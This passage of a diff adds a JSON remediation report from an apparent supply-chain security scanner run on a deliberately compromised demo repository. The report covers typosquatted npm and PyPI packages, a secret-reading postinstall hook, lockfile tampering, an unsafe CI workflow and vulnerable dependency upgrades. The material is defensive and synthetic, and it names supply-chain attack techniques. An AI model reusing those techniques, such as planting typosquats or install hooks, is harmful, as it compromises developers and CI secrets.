+   "explanation": "Day 1 initial risk 6.2; EPSS 0.014 for CVE-2024-3651 (73% percentile); pulled in by an imported dependency (potentially reachable); shipped in a network-facing service (+0.5); fix available: upgrade to >= 3.15",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-030",
+   "priority": "P2",
+   "score": 6.5,
+   "urgent": false,
+   "bucket": "plan the fix",
+   "title": "Dockerfile runs 'npm install' with install scripts enabled",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 6.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 6.5"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 6.5",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-032",
+   "priority": "P2",
+   "score": 6.5,
+   "urgent": false,
+   "bucket": "plan the fix",
+   "title": "image fastbuilds42/node:latest uses a mutable tag and no digest",
+   "category": "anomaly",
+   "component": "fastbuilds42/node:latest",
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 6.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 6.5"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 6.5",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-038",
+   "priority": "P2",
+   "score": 6.0,
+   "urgent": false,
+   "bucket": "plan the fix",
+   "title": "org.apache.logging.log4j:log4j-api@2.14.1: 1 known vulnerability (highest MEDIUM)",
+   "category": "vulnerability",
+   "component": "org.apache.logging.log4j:log4j-api@2.14.1",
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 5.5
+    },
+    "epss": {
+     "value": 0.00595,
+     "points": -0.5
+    },
+    "reachability": {
+     "value": "imported",
+     "points": 0.5
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 5.5",
+    "EPSS 0.006 for CVE-2026-49844 (49% percentile) (-0.5)",
+    "imported by application code (notifier/src/main/java/com/acme/Notifier.java:2, notifier/src/main/java/com/acme/Notifier.java:4) (+0.5)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 2.25.5"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 5.5; EPSS 0.006 for CVE-2026-49844 (49% percentile) (-0.5); imported by application code (notifier/src/main/java/com/acme/Notifier.java:2, notifier/src/main/java/com/acme/Notifier.java:4) (+0.5); shipped in a network-facing service (+0.5); fix available: upgrade to >= 2.25.5",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-027",
+   "priority": "P2",
+   "score": 5.5,
+   "urgent": false,
+   "bucket": "plan the fix",
+   "title": "com.fasterxml.jackson.core:jackson-core@2.9.8: 4 known vulnerabilities (highest HIGH, CVSS 7.5)",
+   "category": "vulnerability",
+   "component": "com.fasterxml.jackson.core:jackson-core@2.9.8",
+   "factors": {
+    "initial_risk": {
+     "value": "High",
+     "points": 7.5
+    },
+    "epss": {
+     "value": 0.00805,
+     "points": -0.5
+    },
+    "reachability": {
+     "value": "not_imported",
+     "points": -2.0
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 7.5",
+    "EPSS 0.008 for CVE-2025-52999 (58% percentile) (-0.5)",
+    "not imported by application code (-2)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 2.18.11"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 7.5; EPSS 0.008 for CVE-2025-52999 (58% percentile) (-0.5); not imported by application code (-2); shipped in a network-facing service (+0.5); fix available: upgrade to >= 2.18.11",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-036",
+   "priority": "P3",
+   "score": 5.0,
+   "urgent": false,
+   "bucket": "monitor / accept",
+   "title": "org.apache.commons:commons-lang3@3.11: 1 known vulnerability (highest MEDIUM, CVSS 6.5)",
+   "category": "vulnerability",
+   "component": "org.apache.commons:commons-lang3@3.11",
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 6.5
+    },
+    "epss": {
+     "value": 0.02632,
+     "points": 0.0
+    },
+    "reachability": {
+     "value": "not_imported",
+     "points": -2.0
+    },
+    "exposure": {
+     "value": "network service",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 6.5",
+    "EPSS 0.026 for CVE-2025-48924 (86% percentile)",
+    "not imported by application code (-2)",
+    "shipped in a network-facing service (+0.5)",
+    "fix available: upgrade to >= 3.18.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 6.5; EPSS 0.026 for CVE-2025-48924 (86% percentile); not imported by application code (-2); shipped in a network-facing service (+0.5); fix available: upgrade to >= 3.18.0",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-039",
+   "priority": "P3",
+   "score": 4.5,
+   "urgent": false,
+   "bucket": "monitor / accept",
+   "title": "'urllib3' has no exact version in worker/requirements.txt (any version)",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 4.0
+    },
+    "ai_triage": {
+     "value": "suspicious (medium, deepseek:deepseek-flash)",
+     "points": 0.5
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 4.0",
+    "triage: suspicious, medium confidence (AI inference) (+0.5)"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 4.0; triage: suspicious, medium confidence (AI inference) (+0.5)",
+   "confidence": "high"
+  },
+  {
+   "finding_id": "F-040",
+   "priority": "P3",
+   "score": 4.0,
+   "urgent": false,
+   "bucket": "monitor / accept",
+   "title": "Dockerfile sets no USER: the container runs as the base image's default user (usually root)",
+   "category": "anomaly",
+   "component": null,
+   "factors": {
+    "initial_risk": {
+     "value": "Medium",
+     "points": 4.0
+    }
+   },
+   "reasons": [
+    "Day 1 initial risk 4.0"
+   ],
+   "unknowns": [],
+   "explanation": "Day 1 initial risk 4.0",
+   "confidence": "high"
+  }
+ ],
+ "proposals": [
+  {
+   "proposal_id": "P-001",
+   "finding_ids": [
+    "F-007"
+   ],
+   "action": "upgrade",
+   "component": "org.apache.logging.log4j:log4j-core@2.14.1",
+   "from_version": "2.14.1",
+   "to_version": "2.25.4",
+   "files_affected": [
+    "notifier/pom.xml"
+   ],
+   "edits": [
+    {
+     "file": "notifier/pom.xml",
+     "op": "pom_set",
+     "group": "org.apache.logging.log4j",
+     "artifact": "log4j-core",
+     "version": "2.25.4"
+    }
+   ],
+   "diff": "--- a/notifier/pom.xml\n+++ b/notifier/pom.xml\n@@ -11,7 +11,7 @@\n   <properties>\n     <maven.compiler.source>11</maven.compiler.source>\n     <maven.compiler.target>11</maven.compiler.target>\n-    <log4j.version>2.14.1</log4j.version>\n+    <log4j.version>2.25.4</log4j.version>\n   </properties>\n \n   <dependencies>\n",
+   "patchable": true,
+   "priority": "P0",
+   "urgent": true,
+   "rationale": "Upgrade org.apache.logging.log4j:log4j-core 2.14.1 -> 2.25.4: fixes the 8 published advisories on 2.14.1; no known advisories remain on the target.",
+   "expected_risk_reduction": "8 of 8 advisories fixed; resolves 1 finding(s)",
+   "compatibility_level": "medium",
+   "compatibility_impact": "minor version change (2.14.1 -> 2.25.4)",
+   "residual_advisories": [],
+   "rollback": "restore org.apache.logging.log4j:log4j-core 2.14.1 in notifier/pom.xml (and the lockfile) by reverting the remediation commit",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-001 upgrades org.apache.logging.log4j:log4j-core from 2.14.1 to 2.25.4, which addresses the 8 published advisories in F-007, including the highest CRITICAL CVSS 10.0 finding, and the packet records no residual advisories on the target. The trade-off is medium compatibility risk from the minor version change 2.14.1 -> 2.25.4, so validation should focus on logging behavior and dependency resolution.",
+   "ai_reviewer_checklist": [
+    "Verify notifier/pom.xml sets log4j.version to 2.25.4 and that the build resolves log4j-core 2.25.4, not 2.14.1.",
+    "Run the notifier build and tests under the configured Java 11 compiler settings to catch logging API or runtime compatibility issues.",
+    "Confirm no residual log4j-core 2.14.1 reference remains in the lockfile or dependency tree."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "approved"
+  },
+  {
+   "proposal_id": "P-002",
+   "finding_ids": [
+    "F-004",
+    "F-012",
+    "F-033",
+    "F-041"
+   ],
+   "action": "replace",
+   "component": "crossenv@7.0.3",
+   "from_version": "7.0.3",
+   "to_version": "cross-env@10.1.0",
+   "files_affected": [
+    "package.json"
+   ],
+   "edits": [
+    {
+     "file": "package.json",
+     "op": "npm_remove",
+     "name": "crossenv"
+    },
+    {
+     "file": "package.json",
+     "op": "npm_add",
+     "name": "cross-env",
+     "version": "^10.1.0",
+     "section": "devDependencies"
+    },
+    {
+     "file": "package.json",
+     "op": "npm_relock"
+    }
+   ],
+   "diff": "--- a/package.json\n+++ b/package.json\n@@ -15,6 +15,6 @@\n   },\n   \"license\": \"MIT\",\n   \"devDependencies\": {\n-    \"crossenv\": \"7.0.3\"\n+    \"cross-env\": \"^10.1.0\"\n   }\n }\n# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)\n",
+   "patchable": true,
+   "priority": "P0",
+   "urgent": true,
+   "rationale": "crossenv@7.0.3 is a documented malicious package of 'cross-env'; replace it with cross-env@10.1.0.",
+   "expected_risk_reduction": "removes the malicious / typosquatted package and its install-time code; resolves 4 finding(s)",
+   "compatibility_level": "low",
+   "compatibility_impact": "crossenv is not imported by application code",
+   "residual_advisories": [],
+   "rollback": "do NOT roll back to the removed package; revert only if the replacement breaks the build",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-002 replaces crossenv@7.0.3 with cross-env@10.1.0 because F-004 and F-012 identify crossenv as a documented malicious typosquat of cross-env, while F-033 and F-041 flag the unexpected dev dependency and its install script. The trade-off is low compatibility risk per the packet because crossenv is not imported by application code, but the package-lock must be regenerated from the registry during validation.",
+   "ai_reviewer_checklist": [
+    "Confirm package.json no longer contains crossenv@7.0.3 and instead declares cross-env@^10.1.0.",
+    "Check the regenerated package-lock.json for removal of crossenv and its install-script entry, and verify cross-env resolves from the registry.",
+    "Run npm install and the dev/build scripts in CI to confirm any tooling that expected the crossenv command still works with cross-env."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-003",
+   "finding_ids": [
+    "F-005",
+    "F-020",
+    "F-021",
+    "F-025"
+   ],
+   "action": "upgrade",
+   "component": "lodash@4.17.15",
+   "from_version": "4.17.15",
+   "to_version": "4.18.1",
+   "files_affected": [
+    "package.json"
+   ],
+   "edits": [
+    {
+     "file": "package.json",
+     "op": "npm_set",
+     "name": "lodash",
+     "version": "4.18.1",
+     "exact": true
+    },
+    {
+     "file": "package.json",
+     "op": "npm_relock"
+    }
+   ],
+   "diff": "--- a/package.json\n+++ b/package.json\n@@ -9,7 +9,7 @@\n   },\n   \"dependencies\": {\n     \"axios\": \"0.21.0\",\n-    \"lodash\": \"4.17.15\",\n+    \"lodash\": \"4.18.1\",\n     \"mkdirp\": \"0.5.1\",\n     \"node-fetch\": \"2.6.0\"\n   },\n# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)\n",
+   "patchable": true,
+   "priority": "P0",
+   "urgent": true,
+   "rationale": "Upgrade lodash 4.17.15 -> 4.18.1: fixes the 5 published advisories on 4.17.15; no known advisories remain on the target. Regenerating the lockfile from the official registry also undoes the lockfile tampering.",
+   "expected_risk_reduction": "5 of 5 advisories fixed; resolves 4 finding(s)",
+   "compatibility_level": "medium",
+   "compatibility_impact": "minor version change (4.17.15 -> 4.18.1)",
+   "residual_advisories": [],
+   "rollback": "restore lodash 4.17.15 in package.json (and the lockfile) by reverting the remediation commit",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-003 upgrades lodash from 4.17.15 to 4.18.1, addressing the 5 known vulnerabilities in F-025 and also undoing the lockfile tampering described by F-005, F-020, and F-021 when the lockfile is regenerated from the official registry. The trade-off is medium compatibility risk from the minor version change 4.17.15 -> 4.18.1, with no residual advisories reported on the target.",
+   "ai_reviewer_checklist": [
+    "Verify package.json pins lodash to 4.18.1 and that the regenerated package-lock.json no longer resolves lodash from npm-mirror.example.invalid.",
+    "Check the lockfile entry for lodash@4.18.1 has expected registry resolution and integrity metadata, with no remaining 4.17.15 tampered entry.",
+    "Run application tests that exercise lodash usage to catch behavioral changes from the minor upgrade."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "approved"
+  },
+  {
+   "proposal_id": "P-004",
+   "finding_ids": [
+    "F-006",
+    "F-013",
+    "F-034"
+   ],
+   "action": "replace",
+   "component": "python3-dateutil@2.8.1",
+   "from_version": "2.8.1",
+   "to_version": "python-dateutil@4.0.0",
+   "files_affected": [
+    "worker/requirements.txt"
+   ],
+   "edits": [
+    {
+     "file": "worker/requirements.txt",
+     "op": "req_replace",
+     "old": "python3-dateutil",
+     "name": "python-dateutil",
+     "version": "4.0.0"
+    }
+   ],
+   "diff": "--- a/worker/requirements.txt\n+++ b/worker/requirements.txt\n@@ -1,5 +1,5 @@\n requests==2.19.1\n PyYAML==5.3\n Jinja2==2.10\n-python3-dateutil==2.8.1\n+python-dateutil==4.0.0\n urllib3\n",
+   "patchable": true,
+   "priority": "P0",
+   "urgent": true,
+   "rationale": "python3-dateutil@2.8.1 is a documented malicious package of 'python-dateutil'; replace it with python-dateutil@4.0.0.",
+   "expected_risk_reduction": "removes the malicious / typosquatted package and its install-time code; resolves 3 finding(s)",
+   "compatibility_level": "low",
+   "compatibility_impact": "python3-dateutil is not imported by application code",
+   "residual_advisories": [],
+   "rollback": "do NOT roll back to the removed package; revert only if the replacement breaks the build",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-004 replaces python3-dateutil@2.8.1 with python-dateutil@4.0.0 because F-006 and F-013 identify python3-dateutil as a documented malicious typosquat of python-dateutil, and F-034 flags it as an unexpected production dependency. The trade-off is low compatibility risk per the packet because python3-dateutil is not imported by application code, and rollback should not restore the malicious package.",
+   "ai_reviewer_checklist": [
+    "Confirm worker/requirements.txt contains python-dateutil==4.0.0 and no longer contains python3-dateutil==2.8.1.",
+    "Search application code and worker requirements for any remaining python3-dateutil references before deploying.",
+    "Build and test the worker environment to confirm the replacement package installs and the service starts without the removed dependency."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-005",
+   "finding_ids": [
+    "F-011"
+   ],
+   "action": "upgrade",
+   "component": "pyyaml@5.3.0",
+   "from_version": "5.3.0",
+   "to_version": "6.0.1",
+   "files_affected": [
+    "worker/requirements.txt"
+   ],
+   "edits": [
+    {
+     "file": "worker/requirements.txt",
+     "op": "req_set",
+     "name": "pyyaml",
+     "version": "6.0.1"
+    }
+   ],
+   "diff": "--- a/worker/requirements.txt\n+++ b/worker/requirements.txt\n@@ -1,5 +1,5 @@\n requests==2.19.1\n-PyYAML==5.3\n+PyYAML==6.0.1\n Jinja2==2.10\n python3-dateutil==2.8.1\n urllib3\n",
+   "patchable": true,
+   "priority": "P0",
+   "urgent": false,
+   "rationale": "Pin pyyaml 5.3.0 -> 6.0.1: fixes the 2 published advisories on 5.3.0; no known advisories remain on the target.",
+   "expected_risk_reduction": "2 of 2 advisories fixed; resolves 1 finding(s)",
+   "compatibility_level": "high",
+   "compatibility_impact": "major version change (5.3.0 -> 6.0.1): breaking API changes are possible, run the tests",
+   "residual_advisories": [],
+   "rollback": "restore pyyaml 5.3.0 in worker/requirements.txt (and the lockfile) by reverting the remediation commit",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-005 upgrades PyYAML from 5.3.0 to 6.0.1, addressing the 2 known vulnerabilities in F-011, including the highest CRITICAL CVSS 9.8 finding, with no residual advisories reported on the target. The trade-off is high compatibility risk from the major version change 5.3.0 -> 6.0.1, so the worker tests and YAML loading paths need validation.",
+   "ai_reviewer_checklist": [
+    "Verify worker/requirements.txt pins PyYAML==6.0.1 and that the lockfile no longer resolves 5.3.0.",
+    "Run the worker test suite and startup checks to catch PyYAML major-version API or behavior changes.",
+    "Review YAML parsing call sites for compatibility with PyYAML 6.0.1, especially any use of loaders or legacy YAML behaviors."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-006",
+   "finding_ids": [
+    "F-001",
+    "F-031"
+   ],
+   "action": "block",
+   "component": "package.json scripts.postinstall",
+   "from_version": null,
+   "to_version": null,
+   "files_affected": [
+    "package.json"
+   ],
+   "edits": [
+    {
+     "file": "package.json",
+     "op": "npm_remove_script",
+     "script": "postinstall"
+    }
+   ],
+   "diff": "--- a/package.json\n+++ b/package.json\n@@ -4,8 +4,7 @@\n   \"description\": \"Order API (SSCG demo target - do not install)\",\n   \"main\": \"src/index.js\",\n   \"scripts\": {\n-    \"start\": \"node src/index.js\",\n-    \"postinstall\": \"node scripts/setup.js\"\n+    \"start\": \"node src/index.js\"\n   },\n   \"dependencies\": {\n     \"axios\": \"0.21.0\",\n",
+   "patchable": true,
+   "priority": "P0",
+   "urgent": false,
+   "rationale": "Remove the 'postinstall' hook from package.json: it runs code that reads secrets on every install (including CI). Review and delete the script file it calls.",
+   "expected_risk_reduction": "stops install-time code execution; resolves 2 finding(s)",
+   "compatibility_level": "medium",
+   "compatibility_impact": "anything the 'postinstall' step legitimately prepared must now be done explicitly",
+   "residual_advisories": [],
+   "rollback": "restore scripts.postinstall in package.json after a security review",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-006 blocks the package.json scripts.postinstall hook, which F-001 and F-031 describe as running scripts/setup.js on every install, including CI, with behavior that reads secrets, hides data with base64, and runs shell commands. The trade-off is medium compatibility risk because any legitimate setup previously performed by postinstall must now be done explicitly.",
+   "ai_reviewer_checklist": [
+    "Confirm package.json no longer defines scripts.postinstall and that scripts.start remains intact.",
+    "Review and delete or remediate scripts/setup.js so the unsafe install behavior cannot be reintroduced accidentally.",
+    "Check CI and developer setup documentation for any dependency on the removed postinstall step and perform required setup explicitly."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-007",
+   "finding_ids": [
+    "F-009"
+   ],
+   "action": "upgrade",
+   "component": "minimist@0.0.8",
+   "from_version": "0.0.8",
+   "to_version": "0.2.4",
+   "files_affected": [
+    "package.json"
+   ],
+   "edits": [
+    {
+     "file": "package.json",
+     "op": "npm_override",
+     "name": "minimist",
+     "version": "0.2.4"
+    },
+    {
+     "file": "package.json",
+     "op": "npm_relock"
+    }
+   ],
+   "diff": "--- a/package.json\n+++ b/package.json\n@@ -16,5 +16,8 @@\n   \"license\": \"MIT\",\n   \"devDependencies\": {\n     \"crossenv\": \"7.0.3\"\n+  },\n+  \"overrides\": {\n+    \"minimist\": \"0.2.4\"\n   }\n }\n# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Override the transitive copies minimist 0.0.8 -> 0.2.4: fixes the 2 published advisories on 0.0.8; no known advisories remain on the target.",
+   "expected_risk_reduction": "2 of 2 advisories fixed; resolves 1 finding(s)",
+   "compatibility_level": "medium",
+   "compatibility_impact": "minor version change (0.0.8 -> 0.2.4)",
+   "residual_advisories": [],
+   "rollback": "restore minimist 0.0.8 in package.json (and the lockfile) by reverting the remediation commit",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-007 replaces the transitive minimist@0.0.8 with a package.json override to 0.2.4, which clears the two advisories (highest CRITICAL, CVSS 9.8) reported in F-009, and the target has no residual advisories. The trade-off is a minor-version jump (0.0.8 -> 0.2.4) on a transitive dependency that other packages may rely on, so the compatibility risk is medium even though the diff is small. Rollback is a simple revert of the override and lockfile commit if consumers break.",
+   "ai_reviewer_checklist": [
+    "Run the full test suite and any CLI/argument-parsing paths that consume minimist transitively to confirm 0.2.4 behaves identically.",
+    "Verify in the regenerated package-lock.json that no nested copy of minimist 0.0.8 survives the override.",
+    "Confirm the override block in package.json applies to the intended dependency tree and does not mask a direct dependency version pin."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-008",
+   "finding_ids": [
+    "F-023"
+   ],
+   "action": "upgrade",
+   "component": "axios@0.21.0",
+   "from_version": "0.21.0",
+   "to_version": "0.34.0",
+   "files_affected": [
+    "package.json"
+   ],
+   "edits": [
+    {
+     "file": "package.json",
+     "op": "npm_set",
+     "name": "axios",
+     "version": "0.34.0",
+     "exact": true
+    },
+    {
+     "file": "package.json",
+     "op": "npm_relock"
+    }
+   ],
+   "diff": "--- a/package.json\n+++ b/package.json\n@@ -8,7 +8,7 @@\n     \"postinstall\": \"node scripts/setup.js\"\n   },\n   \"dependencies\": {\n-    \"axios\": \"0.21.0\",\n+    \"axios\": \"0.34.0\",\n     \"lodash\": \"4.17.15\",\n     \"mkdirp\": \"0.5.1\",\n     \"node-fetch\": \"2.6.0\"\n# + package-lock.json regenerated from the registry during validation (npm --package-lock-only)\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Upgrade axios 0.21.0 -> 0.34.0: fixes the 25 published advisories on 0.21.0; no known advisories remain on the target.",
+   "expected_risk_reduction": "25 of 25 advisories fixed; resolves 1 finding(s)",
+   "compatibility_level": "medium",
+   "compatibility_impact": "minor version change (0.21.0 -> 0.34.0)",
+   "residual_advisories": [],
+   "rollback": "restore axios 0.21.0 in package.json (and the lockfile) by reverting the remediation commit",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-008 upgrades the direct dependency axios from 0.21.0 to 0.34.0, removing the 25 advisories listed in F-023 (highest HIGH, CVSS 8.6) with no residual advisories on the target. Because axios is direct and used at runtime, the minor-version change carries medium compatibility risk across request/response and interceptor behavior. The change is confined to package.json plus a regenerated lockfile, so rollback is a clean revert.",
+   "ai_reviewer_checklist": [
+    "Exercise the application's HTTP call sites (timeouts, interceptors, error handling) against axios 0.34.0 to catch behavior changes.",
+    "Verify the lockfile regenerated cleanly and that no other dependency still pins a vulnerable axios copy.",
+    "Check the affected service end-to-end in a staging environment before production rollout."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-009",
+   "finding_ids": [
+    "F-002"
+   ],
+   "action": "escalate_review",
+   "component": ".github/workflows/ci.yml",
+   "from_version": null,
+   "to_version": null,
+   "files_affected": [
+    ".github/workflows/ci.yml"
+   ],
+   "edits": [],
+   "diff": "",
+   "patchable": false,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Do not check out the pull request's code in a pull_request_target workflow; use the pull_request trigger, or split into an unprivileged build and a privileged workflow_run.",
+   "expected_risk_reduction": "",
+   "compatibility_level": "low",
+   "compatibility_impact": "",
+   "residual_advisories": [],
+   "rollback": "",
+   "validation_plan": [],
+   "notes": [
+    "use pull_request instead, or never check out PR head in pull_request_target"
+   ],
+   "ai_rationale": "",
+   "ai_reviewer_checklist": [],
+   "generated_by": "rules (remediation planner)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-010",
+   "finding_ids": [
+    "F-003"
+   ],
+   "action": "escalate_review",
+   "component": ".github/workflows/ci.yml",
+   "from_version": null,
+   "to_version": null,
+   "files_affected": [
+    ".github/workflows/ci.yml"
+   ],
+   "edits": [],
+   "diff": "",
+   "patchable": false,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Stop passing the secret to downloaded / mutable code (see the related proposals) and rotate the secret: it may already be exposed.",
+   "expected_risk_reduction": "",
+   "compatibility_level": "low",
+   "compatibility_impact": "",
+   "residual_advisories": [],
+   "rollback": "",
+   "validation_plan": [],
+   "notes": [
+    "pin the action / verify the script; rotate the secret if the workflow has run"
+   ],
+   "ai_rationale": "",
+   "ai_reviewer_checklist": [],
+   "generated_by": "rules (remediation planner)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-011",
+   "finding_ids": [
+    "F-024"
+   ],
+   "action": "upgrade",
+   "component": "jinja2@2.10.0",
+   "from_version": "2.10.0",
+   "to_version": "3.1.6",
+   "files_affected": [
+    "worker/requirements.txt"
+   ],
+   "edits": [
+    {
+     "file": "worker/requirements.txt",
+     "op": "req_set",
+     "name": "jinja2",
+     "version": "3.1.6"
+    }
+   ],
+   "diff": "--- a/worker/requirements.txt\n+++ b/worker/requirements.txt\n@@ -1,5 +1,5 @@\n requests==2.19.1\n PyYAML==5.3\n-Jinja2==2.10\n+Jinja2==3.1.6\n python3-dateutil==2.8.1\n urllib3\n",
+   "patchable": true,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "Pin jinja2 2.10.0 -> 3.1.6: fixes the 6 published advisories on 2.10.0; no known advisories remain on the target.",
+   "expected_risk_reduction": "6 of 6 advisories fixed; resolves 1 finding(s)",
+   "compatibility_level": "high",
+   "compatibility_impact": "major version change (2.10.0 -> 3.1.6): breaking API changes are possible, run the tests",
+   "residual_advisories": [],
+   "rollback": "restore jinja2 2.10.0 in worker/requirements.txt (and the lockfile) by reverting the remediation commit",
+   "validation_plan": [
+    "copy the repository to a sandbox",
+    "apply the approved edits",
+    "regenerate lockfiles",
+    "install / build (install scripts disabled)",
+    "run the project's tests if it has any",
+    "docker build if Docker is running",
+    "rescan with the Day 1 pipeline",
+    "compare SBOM and findings before / after, flag anything new"
+   ],
+   "notes": [],
+   "ai_rationale": "P-011 pins Jinja2 from 2.10.0 to 3.1.6 in worker/requirements.txt, clearing the 6 advisories in F-024 (highest HIGH, CVSS 8.6) with no residual advisories on the target. This is a major-version change (2.x -> 3.x) with known breaking API changes, so compatibility risk is high and test coverage is the main safeguard. The edit is a one-line pin plus lockfile, making rollback straightforward via revert.",
+   "ai_reviewer_checklist": [
+    "Run the worker's template-rendering tests and manually render representative templates for Jinja2 3.x API/filter deprecations.",
+    "Check that no other Python dependency in worker/requirements.txt constrains Jinja2 below 3.1.6 or conflicts with MarkupSafe version requirements.",
+    "Confirm the worker's error paths for template failures still behave as expected after the upgrade."
+   ],
+   "generated_by": "rules (remediation planner) + deepseek:deepseek-flash (rationale)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-012",
+   "finding_ids": [
+    "F-018"
+   ],
+   "action": "escalate_review",
+   "component": null,
+   "from_version": null,
+   "to_version": null,
+   "files_affected": [],
+   "edits": [],
+   "diff": "",
+   "patchable": false,
+   "priority": "P1",
+   "urgent": false,
+   "rationale": "first-time contributor fastbuilds42 changed 6 build/dependency files in 8cad42e (\"chore: routine dependency refresh\"). Require a second reviewer for build and dependency files from this author; the other proposals address the concrete changes.",
+   "expected_risk_reduction": "",
+   "compatibility_level": "low",
+   "compatibility_impact": "",
+   "residual_advisories": [],
+   "rollback": "",
+   "validation_plan": [],
+   "notes": [
+    "process change, nothing to patch"
+   ],
+   "ai_rationale": "",
+   "ai_reviewer_checklist": [],
+   "generated_by": "rules (remediation planner)",
+   "status": "pending"
+  },
+  {
+   "proposal_id": "P-013",
+   "finding_ids": [
+    "F-019",
+    "F-032"
+   ],
+   "action": "update_base_image",
+   "component": "fastbuilds42/node:latest",
+   "from_version": "latest",
+   "to_version": "node:lts-slim@sha256:e6bedef217677b276c591795e169840edd9096dbf13f29df8ef8d1856b8820bc",
+   "files_affected": [
+    "Dockerfile"
+   ],
+   "edits": [
+    {
